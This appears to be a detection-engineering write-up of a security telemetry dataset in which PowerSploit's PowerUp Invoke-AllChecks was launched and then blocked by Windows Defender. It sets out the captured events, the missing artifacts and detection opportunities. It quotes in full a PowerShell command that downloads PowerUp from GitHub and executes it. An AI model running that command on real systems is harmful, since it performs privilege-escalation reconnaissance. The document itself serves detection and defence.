# T1059.001-19: PowerShell — PowerUp Invoke-AllChecks

## Technique Context

T1059.001 (PowerShell) represents one of the most prevalent execution techniques in modern Windows environments. PowerShell's dual nature as both a legitimate administrative tool and powerful attack vector makes it a cornerstone of many adversary campaigns. This specific test executes PowerUp's `Invoke-AllChecks` function, a well-known privilege escalation enumeration tool from the PowerSploit framework that systematically searches for common Windows privilege escalation vectors including unquoted service paths, weak service permissions, DLL hijacking opportunities, and registry-based auto-elevate conditions.

The detection community focuses heavily on PowerShell command-line arguments, script block content, module loads, and behavioral patterns. PowerUp specifically generates significant process access events as it enumerates services, processes, and system configurations, making it detectable through both content-based and behavioral analytics.

## What This Dataset Contains

The dataset captures a comprehensive execution of the PowerUp framework with clear evidence of the download-and-execute pattern. Security event 4688 shows the critical command line: `"powershell.exe" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1 -UseBasicParsing) Invoke-AllChecks}`.

However, the PowerShell process exits with status code 0xC0000022 (STATUS_ACCESS_DENIED), indicating Windows Defender blocked the execution before PowerUp could run. The PowerShell channel contains only framework boilerplate - Set-StrictMode and Set-ExecutionPolicy events with no actual PowerUp script blocks captured.

Sysmon provides rich telemetry including process creation for whoami.exe (EID 1), process access events showing PowerShell accessing the whoami process (EID 10), and multiple DLL loads including System.Management.Automation.ni.dll. A CreateRemoteThread event (EID 8) shows PowerShell attempting thread creation in an unknown target process, likely related to the blocked execution attempt.

## What This Dataset Does Not Contain

The dataset lacks the actual PowerUp execution artifacts due to Windows Defender intervention. You won't find PowerUp's characteristic script blocks containing privilege escalation checks like `Get-ServiceUnquoted`, `Get-ModifiableServiceFile`, or `Get-UnattendedInstallFile`. Network events showing the download of PowerUp.ps1 from GitHub are absent from this collection, though urlmon.dll loads in Sysmon suggest web request capability was established.

The blocked execution means PowerUp's typical behavioral signatures are missing - no extensive WMI queries, no service enumeration via SC commands, and no registry key access patterns that would normally accompany a successful privilege escalation assessment.

## Assessment

This dataset provides excellent visibility into Windows Defender's blocking behavior and the telemetry generated when offensive PowerShell tools are intercepted. The command-line capture in Security 4688 is forensically valuable, preserving the complete attack chain including the TLS configuration, remote download URL, and intended payload execution. The process access and remote thread creation events in Sysmon demonstrate behavioral detection opportunities even when the primary payload is blocked.

For detection engineering, this represents a common real-world scenario where endpoint protection prevents full technique execution but still generates valuable attack indicators. The dataset would be stronger with successful PowerUp execution to show the complete attack lifecycle, but the blocked execution scenario is equally important for understanding defensive telemetry patterns.

## Detection Opportunities Present in This Data

1. **PowerShell Remote Download Pattern** - Security 4688 command line contains `iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/` indicating remote script execution from known offensive tooling repository

2. **PowerUp Framework Indicators** - Command line explicitly references PowerSploit repository path and `Invoke-AllChecks` function, providing high-confidence IOCs

3. **TLS Protocol Manipulation** - Command line shows explicit SecurityProtocol configuration to TLS 1.2, often used to bypass default PowerShell web request restrictions

4. **Blocked Execution Status** - Security 4689 exit code 0xC0000022 indicates endpoint protection intervention, valuable for measuring defensive effectiveness

5. **Process Access to System Utilities** - Sysmon EID 10 shows PowerShell accessing whoami.exe with full access rights (0x1FFFFF), indicating enumeration attempts

6. **CreateRemoteThread from PowerShell** - Sysmon EID 8 shows PowerShell attempting remote thread creation, indicating potential process injection or hollowing attempts

7. **Rapid Process Lifecycle** - PowerShell processes show very short execution times with quick termination, suggesting automated or scripted execution rather than interactive use
